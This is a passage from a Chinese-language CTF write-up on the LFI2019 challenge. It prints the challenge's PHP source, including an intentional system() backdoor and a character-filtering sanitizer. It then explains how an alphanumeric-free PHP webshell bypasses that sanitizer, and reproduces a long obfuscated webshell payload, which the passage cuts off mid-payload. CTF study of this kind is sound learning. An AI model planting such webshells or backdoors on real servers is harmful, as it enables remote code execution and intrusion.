</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>content</span> <span class=o>=</span> <span class=p>(</span><span class=nx>string</span><span class=p>)</span><span class=o>@</span><span class=nx>code_sanitizer</span><span class=p>(</span><span class=nv>$data</span><span class=p>[</span><span class=s1>&#39;content&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>function</span> <span class=nf>put</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>            <span class=c1>// just another typical file insertion //
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=k>if</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>filename</span> <span class=o>===</span> <span class=k>false</span><span class=p>){</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=p>[</span><span class=s2>&#34;msg&#34;</span> <span class=o>=&gt;</span> <span class=s2>&#34;blocked by path sanitizer&#34;</span><span class=p>,</span> <span class=s2>&#34;type&#34;</span> <span class=o>=&gt;</span> <span class=s2>&#34;error&#34;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=c1>// check if file exists //
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=k>if</span><span class=p>(</span><span class=nx>file_exists</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>dir</span> <span class=o>.</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>filename</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=p>[</span><span class=s2>&#34;msg&#34;</span> <span class=o>=&gt;</span> <span class=s2>&#34;file exists&#34;</span><span class=p>,</span> <span class=s2>&#34;type&#34;</span> <span class=o>=&gt;</span> <span class=s2>&#34;error&#34;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=nx>file_put_contents</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>dir</span> <span class=o>.</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>filename</span><span class=p>,</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>content</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=c1>// just check if file is written. hopefully. //
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=k>if</span><span class=p>(</span><span class=o>@</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>dir</span> <span class=o>.</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>filename</span><span class=p>)</span> <span class=o>==</span> <span class=s2>&#34;&#34;</span><span class=p>){</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=p>[</span><span class=s2>&#34;msg&#34;</span> <span class=o>=&gt;</span> <span class=s2>&#34;file not written.&#34;</span><span class=p>,</span> <span class=s2>&#34;type&#34;</span> <span class=o>=&gt;</span> <span class=s2>&#34;error&#34;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=p>[</span><span class=s2>&#34;type&#34;</span> <span class=o>=&gt;</span> <span class=s2>&#34;success&#34;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// Triggering this is nearly impossible //
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>class</span> <span class=nc>System</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>function</span> <span class=fm>__destruct</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>            <span class=k>global</span> <span class=nv>$seed</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=c1>// ain&#39;t Argon2, ain&#39;t pbkdf2. what could go wrong?
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=nv>$flag</span> <span class=o>=</span> <span class=nx>hash</span><span class=p>(</span><span class=s1>&#39;sha256&#39;</span><span class=p>,</span> <span class=nv>$seed</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=nv>$flag</span><span class=p>]){</span>
</span></span><span class=line><span class=cl>                <span class=o>@</span><span class=nx>system</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=nv>$flag</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=o>@</span><span class=nx>unserialize</span><span class=p>(</span><span class=nv>$_SESSION</span><span class=p>[</span><span class=nv>$flag</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// Don&#39;t call me a savage... I gave everything you need //
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>if</span><span class=p>(</span><span class=nv>$_SERVER</span><span class=p>[</span><span class=s1>&#39;QUERY_STRING&#39;</span><span class=p>]</span> <span class=o>===</span> <span class=s2>&#34;show-me-the-hint&#34;</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=nx>show_source</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>exit</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// XSS protection and hints ^-^ //
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nx>header</span><span class=p>(</span><span class=s1>&#39;X-Hint: /index.php?show-me-the-hint&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>header</span><span class=p>(</span><span class=s1>&#39;X-Frame-Options: DENY&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>header</span><span class=p>(</span><span class=s1>&#39;X-XSS-Protection: 1; mode=block;&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>header</span><span class=p>(</span><span class=s1>&#39;X-Content-Type-Options: nosniff&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>header</span><span class=p>(</span><span class=s1>&#39;Content-Type: text/html; charset=utf-8&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>header</span><span class=p>(</span><span class=s1>&#39;Cache-Control: no-store, no-cache, must-revalidate, max-age=0&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>//header(&#34;Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;nonce-${seed}&#39; &#39;unsafe-eval&#39;;&#34; .
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>//&#34;font-src &#39;nonce-${seed}&#39; fonts.gstatic.com; style-src &#39;nonce-${seed}&#39; fonts.googleapis.com;&#34;);
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>    <span class=c1>// Hello, JSON! //
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nv>$parsed_url</span> <span class=o>=</span> <span class=nx>explode</span><span class=p>(</span><span class=s2>&#34;&amp;&#34;</span><span class=p>,</span> <span class=nv>$_SERVER</span><span class=p>[</span><span class=s1>&#39;QUERY_STRING&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nx>count</span><span class=p>(</span><span class=nv>$parsed_url</span><span class=p>)</span> <span class=o>&gt;=</span> <span class=mi>2</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=nx>header</span><span class=p>(</span><span class=s2>&#34;Content-Type:text/json&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>switch</span><span class=p>(</span><span class=nv>$parsed_url</span><span class=p>[</span><span class=mi>0</span><span class=p>]){</span>
</span></span><span class=line><span class=cl>            <span class=k>case</span> <span class=s2>&#34;get&#34;</span><span class=o>:</span>
</span></span><span class=line><span class=cl>                <span class=nv>$get</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Get</span><span class=p>(</span><span class=nv>$parsed_url</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>                <span class=nv>$data</span> <span class=o>=</span> <span class=nv>$get</span><span class=o>-&gt;</span><span class=na>get</span><span class=p>();</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=k>case</span> <span class=s2>&#34;put&#34;</span><span class=o>:</span>
</span></span><span class=line><span class=cl>                <span class=nv>$put</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Put</span><span class=p>(</span><span class=nv>$parsed_url</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=nv>$_POST</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=nv>$data</span> <span class=o>=</span> <span class=nv>$put</span><span class=o>-&gt;</span><span class=na>put</span><span class=p>();</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=k>default</span><span class=o>:</span>
</span></span><span class=line><span class=cl>                <span class=nv>$data</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&#34;msg&#34;</span> <span class=o>=&gt;</span> <span class=s2>&#34;Invalid data.&#34;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>die</span><span class=p>(</span><span class=nx>json_encode</span><span class=p>(</span><span class=nv>$data</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>&lt;!doctype html&gt;
</span></span></span><span class=line><span class=cl><span class=err>&lt;html&gt;
</span></span></span><span class=line><span class=cl><span class=err>&lt;head&gt;
</span></span></span><span class=line><span class=cl><span class=err>    &lt;meta charset=utf-8&gt;
</span></span></span><span class=line><span class=cl><span class=err>    &lt;link rel=&#34;stylesheet&#34; href=&#34;//stackpath.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css&#34; nonce=&#34;&lt;?php echo $seed; ?&gt;&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>    &lt;link rel=&#34;styleshhet&#34; href=&#34;//fonts.googleapis.com/css?family=Muli:300,400,700&#34; nonce=&#34;&lt;?php echo $seed; ?&gt;&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>    &lt;link rel=&#34;stylesheet&#34; href=&#34;./static/legit.css&#34; nonce=&#34;&lt;?php echo $seed; ?&gt;&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>    &lt;title&gt;LFI2019&lt;/title&gt;
</span></span></span><span class=line><span class=cl><span class=err>&lt;/head&gt;
</span></span></span><span class=line><span class=cl><span class=err>&lt;body&gt;
</span></span></span><span class=line><span class=cl><span class=err>    &lt;div class=&#34;modal fade&#34; id=&#34;put-modal&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>        &lt;div class=&#34;modal-dialog modal-lg&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>            &lt;div class=&#34;modal-content&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>                &lt;div class=&#34;modal-header&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>                    &lt;h5 class=&#34;modal-title&#34;&gt;put2019&lt;/h5&gt;
</span></span></span><span class=line><span class=cl><span class=err>                    &lt;button type=&#34;button&#34; class=&#34;close&#34; data-dismiss=&#34;modal&#34; aria-label=&#34;Close&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>                        &lt;span aria-hidden=&#34;true&#34;&gt;&amp;times;&lt;/span&gt;
</span></span></span><span class=line><span class=cl><span class=err>                    &lt;/button&gt;
</span></span></span><span class=line><span class=cl><span class=err>                &lt;/div&gt;
</span></span></span><span class=line><span class=cl><span class=err>                &lt;div class=&#34;modal-body&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>                    &lt;div class=&#34;form-group&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>                        &lt;label for=&#34;upload-filename&#34; class=&#34;col-form-label&#34;&gt;Filename:&lt;/label&gt;
</span></span></span><span class=line><span class=cl><span class=err>                        &lt;input type=&#34;text&#34; class=&#34;form-control&#34; id=&#34;upload-filename&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>                    &lt;/div&gt;
</span></span></span><span class=line><span class=cl><span class=err>                    &lt;div class=&#34;form-group&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>                        &lt;label for=&#34;upload-content&#34; class=&#34;col-form-label&#34;&gt;Content:&lt;/label&gt;
</span></span></span><span class=line><span class=cl><span class=err>                        &lt;textarea class=&#34;form-control disabled&#34; id=&#34;upload-content&#34; rows=10&gt;&lt;/textarea&gt;
</span></span></span><span class=line><span class=cl><span class=err>                    &lt;/div&gt;
</span></span></span><span class=line><span class=cl><span class=err>                &lt;/div&gt;
</span></span></span><span class=line><span class=cl><span class=err>                &lt;div class=&#34;modal-footer&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>                    &lt;button type=&#34;button&#34; class=&#34;btn btn-secondary&#34; data-dismiss=&#34;modal&#34;&gt;Close&lt;/button&gt;
</span></span></span><span class=line><span class=cl><span class=err>                    &lt;button type=&#34;button&#34; class=&#34;btn btn-primary&#34; id=&#34;upload-submit&#34;&gt;put();&lt;/button&gt;
</span></span></span><span class=line><span class=cl><span class=err>                &lt;/div&gt;
</span></span></span><span class=line><span class=cl><span class=err>            &lt;/div&gt;
</span></span></span><span class=line><span class=cl><span class=err>        &lt;/div&gt;
</span></span></span><span class=line><span class=cl><span class=err>    &lt;/div&gt;
</span></span></span><span class=line><span class=cl><span class=err>    &lt;div class=&#34;modal fade&#34; id=&#34;get-modal&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>        &lt;div class=&#34;modal-dialog modal-lg&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>            &lt;div class=&#34;modal-content&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>                &lt;div class=&#34;modal-header&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>                    &lt;h5 class=&#34;modal-title&#34;&gt;get2019&lt;/h5&gt;
</span></span></span><span class=line><span class=cl><span class=err>                    &lt;button type=&#34;button&#34; class=&#34;close&#34; data-dismiss=&#34;modal&#34; aria-label=&#34;Close&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>                        &lt;span aria-hidden=&#34;true&#34;&gt;&amp;times;&lt;/span&gt;
</span></span></span><span class=line><span class=cl><span class=err>                    &lt;/button&gt;
</span></span></span><span class=line><span class=cl><span class=err>                &lt;/div&gt;
</span></span></span><span class=line><span class=cl><span class=err>                &lt;div class=&#34;modal-body&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>                    &lt;div class=&#34;form-group&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>                        &lt;label for=&#34;include-filename&#34; class=&#34;col-form-label&#34;&gt;Filename:&lt;/label&gt;
</span></span></span><span class=line><span class=cl><span class=err>                        &lt;input type=&#34;text&#34; class=&#34;form-control&#34; id=&#34;include-filename&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>                    &lt;/div&gt;
</span></span></span><span class=line><span class=cl><span class=err>                    &lt;div class=&#34;form-group&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>                        &lt;textarea class=&#34;form-control disabled&#34; id=&#34;include-content&#34; disabled rows=10&gt;&lt;/textarea&gt;
</span></span></span><span class=line><span class=cl><span class=err>                    &lt;/div&gt;
</span></span></span><span class=line><span class=cl><span class=err>                &lt;/div&gt;
</span></span></span><span class=line><span class=cl><span class=err>                &lt;div class=&#34;modal-footer&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>                    &lt;button type=&#34;button&#34; class=&#34;btn btn-secondary&#34; data-dismiss=&#34;modal&#34;&gt;Close&lt;/button&gt;
</span></span></span><span class=line><span class=cl><span class=err>                    &lt;button type=&#34;button&#34; class=&#34;btn btn-primary&#34; id=&#34;include-submit&#34;&gt;include();&lt;/button&gt;
</span></span></span><span class=line><span class=cl><span class=err>                &lt;/div&gt;
</span></span></span><span class=line><span class=cl><span class=err>            &lt;/div&gt;
</span></span></span><span class=line><span class=cl><span class=err>        &lt;/div&gt;
</span></span></span><span class=line><span class=cl><span class=err>    &lt;/div&gt;
</span></span></span><span class=line><span class=cl><span class=err>    &lt;div class=&#34;modal fade&#34; id=&#34;info-modal&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>        &lt;div class=&#34;modal-dialog modal-lg&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>            &lt;div class=&#34;modal-content&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>                &lt;div class=&#34;modal-header&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>                    &lt;button type=&#34;button&#34; class=&#34;close&#34; data-dismiss=&#34;modal&#34; aria-hidden=&#34;true&#34;&gt;×&lt;/button&gt;
</span></span></span><span class=line><span class=cl><span class=err>                &lt;/div&gt;
</span></span></span><span class=line><span class=cl><span class=err>                &lt;div class=&#34;modal-body&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>                    &lt;p&gt;
</span></span></span><span class=line><span class=cl><span class=err>                        Hi there! We introduce LFI2019 with another technique that never came out on CTFs. 
</span></span></span><span class=line><span class=cl><span class=err>                        We want to end tedious LFI challenges starting from this year.
</span></span></span><span class=line><span class=cl><span class=err>                        Traps are everywhere, so be warned. Good Luck!
</span></span></span><span class=line><span class=cl><span class=err>                    &lt;/p&gt;
</span></span></span><span class=line><span class=cl><span class=err>                    &lt;p&gt;
</span></span></span><span class=line><span class=cl><span class=err>                        .. and of course, the main objective for this challenge is absolutely straightforward: Leak the sourcecode of flag file to solve this challenge. flag is located at &lt;code&gt;flag.php&lt;/code&gt;.
</span></span></span><span class=line><span class=cl><span class=err>                    &lt;/p&gt;
</span></span></span><span class=line><span class=cl><span class=err>                &lt;/div&gt;
</span></span></span><span class=line><span class=cl><span class=err>                &lt;div class=&#34;modal-footer&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>                    &lt;button type=&#34;button&#34; class=&#34;btn btn-default&#34; data-dismiss=&#34;modal&#34;&gt;Close&lt;/button&gt;
</span></span></span><span class=line><span class=cl><span class=err>                &lt;/div&gt;
</span></span></span><span class=line><span class=cl><span class=err>            &lt;/div&gt;
</span></span></span><span class=line><span class=cl><span class=err>        &lt;/div&gt;
</span></span></span><span class=line><span class=cl><span class=err>    &lt;/div&gt;
</span></span></span><span class=line><span class=cl><span class=err>    &lt;ul class=&#34;text hidden&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>        &lt;li&gt;L&lt;/li&gt;
</span></span></span><span class=line><span class=cl><span class=err>        &lt;li class=&#34;ghost&#34;&gt;e&lt;/li&gt;
</span></span></span><span class=line><span class=cl><span class=err>        &lt;li class=&#34;ghost&#34;&gt;g&lt;/li&gt;
</span></span></span><span class=line><span class=cl><span class=err>        &lt;li class=&#34;ghost&#34;&gt;i&lt;/li&gt;
</span></span></span><span class=line><span class=cl><span class=err>        &lt;li class=&#34;ghost&#34;&gt;t&lt;/li&gt;
</span></span></span><span class=line><span class=cl><span class=err>        &lt;li class=&#34;spaced&#34;&gt;F&lt;/li&gt;
</span></span></span><span class=line><span class=cl><span class=err>        &lt;li class=&#34;ghost&#34;&gt;i&lt;/li&gt;
</span></span></span><span class=line><span class=cl><span class=err>        &lt;li class=&#34;ghost&#34;&gt;l&lt;/li&gt;
</span></span></span><span class=line><span class=cl><span class=err>        &lt;li class=&#34;ghost&#34;&gt;e&lt;/li&gt;
</span></span></span><span class=line><span class=cl><span class=err>        &lt;li class=&#34;spaced&#34;&gt;I&lt;/li&gt;
</span></span></span><span class=line><span class=cl><span class=err>        &lt;li class=&#34;ghost&#34;&gt;n&lt;/li&gt;
</span></span></span><span class=line><span class=cl><span class=err>        &lt;li class=&#34;ghost&#34;&gt;c&lt;/li&gt;
</span></span></span><span class=line><span class=cl><span class=err>        &lt;li class=&#34;ghost&#34;&gt;l&lt;/li&gt;
</span></span></span><span class=line><span class=cl><span class=err>        &lt;li class=&#34;ghost&#34;&gt;u&lt;/li&gt;
</span></span></span><span class=line><span class=cl><span class=err>        &lt;li class=&#34;ghost&#34;&gt;s&lt;/li&gt;
</span></span></span><span class=line><span class=cl><span class=err>        &lt;li class=&#34;ghost&#34;&gt;i&lt;/li&gt;
</span></span></span><span class=line><span class=cl><span class=err>        &lt;li class=&#34;ghost&#34;&gt;o&lt;/li&gt;
</span></span></span><span class=line><span class=cl><span class=err>        &lt;li class=&#34;ghost&#34;&gt;n&lt;/li&gt;
</span></span></span><span class=line><span class=cl><span class=err>        &lt;li class=&#34;spaced&#34;&gt;2019&lt;/li&gt;
</span></span></span><span class=line><span class=cl><span class=err>        &lt;br&gt;
</span></span></span><span class=line><span class=cl><span class=err>		&lt;br&gt;
</span></span></span><span class=line><span class=cl><span class=err>        &lt;div class=&#34;hide&#34; id=&#34;kawaii&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>            &lt;center&gt;
</span></span></span><span class=line><span class=cl><span class=err>                &lt;button class=&#34;btn col-4 btn-success half&#34; id=&#34;get&#34;&gt;include&lt;/button&gt;
</span></span></span><span class=line><span class=cl><span class=err>                &lt;button class=&#34;btn col-4 btn-warning&#34; id=&#34;put&#34;&gt;upload&lt;/button&gt;
</span></span></span><span class=line><span class=cl><span class=err>                &lt;button class=&#34;btn col-3 btn-info&#34; id=&#34;info&#34;&gt;info&lt;/button&gt;
</span></span></span><span class=line><span class=cl><span class=err>                &lt;p class=&#34;lightgrey&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>                    Reference ID: &lt;b class=&#34;ref&#34;&gt;&lt;?php echo $seed; ?&gt;&lt;/b&gt;
</span></span></span><span class=line><span class=cl><span class=err>                &lt;/p&gt;
</span></span></span><span class=line><span class=cl><span class=err>                Made with &amp;hearts; by stypr.
</span></span></span><span class=line><span class=cl><span class=err>            &lt;/center&gt;
</span></span></span><span class=line><span class=cl><span class=err>        &lt;/div&gt;
</span></span></span><span class=line><span class=cl><span class=err>    &lt;/ul&gt;
</span></span></span><span class=line><span class=cl><span class=err>    &lt;script src=&#34;https://code.jquery.com/jquery-3.3.1.min.js&#34; nonce=&#34;&lt;?php echo $seed; ?&gt;&#34;&gt;&lt;/script&gt;
</span></span></span><span class=line><span class=cl><span class=err>    &lt;script src=&#34;//stackpath.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js&#34; nonce=&#34;&lt;?php echo $seed; ?&gt;&#34;&gt;&lt;/script&gt;
</span></span></span><span class=line><span class=cl><span class=err>    &lt;script src=&#34;./static/legit.js&#34; nonce=&#34;&lt;?php echo $seed; ?&gt;&#34; defer&gt;&lt;/script&gt;
</span></span></span><span class=line><span class=cl><span class=err>&lt;/body&gt;
</span></span></span><span class=line><span class=cl><span class=err>&lt;/html&gt;
</span></span></span><span class=line><span class=cl><span class=err>&lt;!-- https://www.youtube.com/watch?v=OEpeRmPkRIU --&gt;
</span></span></span></code></pre></td></tr></table></div></div><p>不过比较无语的是有很多的垃圾代码&mldr;可以看到有个出题人留的后门函数，but 因为<code>code_sanitizer</code>的过滤</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=c1>// The new kakkoii code-san is re-implemented. //
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>function</span> <span class=nf>code_sanitizer</span><span class=p>(</span><span class=nv>$code</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=c1>// Computer-chan, please don&#39;t speak english. Speak something else! //
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nv>$code</span> <span class=o>=</span> <span class=nx>preg_replace</span><span class=p>(</span><span class=s2>&#34;/[^&lt;&gt;!@#$%\^&amp;*\_?+\.\-</span><span class=se>\\</span><span class=s2>\&#39;</span><span class=se>\&#34;</span><span class=s2>\=\(\)\[\]\;]/u&#34;</span><span class=p>,</span> <span class=s2>&#34;*Nope*&#34;</span><span class=p>,</span> <span class=p>(</span><span class=nx>string</span><span class=p>)</span><span class=nv>$code</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nv>$code</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>这里我们可以使用无字母的 webshell 来进行一个绕过，可以参考<a class=link href=https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html#_4 target=_blank rel=noopener>一些不包含数字和字母的webshell</a>，这里我就直接放 ROIS 师傅们的无字母 webshell 内容了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?=</span><span class=nv>$_</span><span class=o>=</span><span class=p>[]</span><span class=cp>?&gt;</span><span class=err>&lt;?=$_=@&#34;$_&#34;?&gt;&lt;?=$___=$_[&#39;!&#39;!=&#39;@&#39;]?&gt;&lt;?=$____=$_[(&#39;!&#39;==&#39;!&#39;)+(&#39;!&#39;==&#39;!&#39;)+(&#39;!&#39;==&#39;!&#39;)]?&gt;&lt;?=$_=$____?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$__.=$_?&gt;&lt;?=$_=$____?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$__.=$_?&gt;&lt;?=$_=$____?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$__.=$_?&gt;&lt;?=$_=$____?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$__.=$_?&gt;&lt;?=$_=&#34;_&#34;?&gt;&lt;?=$__.=$_?&gt;&lt;?=$_=$____?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$__.=$_?&gt;&lt;?=$_=$____?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$__.=$_?&gt;&lt;?=$_=$____?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$__.=$_?&gt;&lt;?=$_=&#34;_&#34;?&gt;&lt;?=$__.=$_?&gt;&lt;?=$_=$____?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$__.=$_?&gt;&lt;?=$_=$____?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$__.=$_?&gt;&lt;?=$_=$____?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$__.=$_?&gt;&lt;?=$_=$____?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_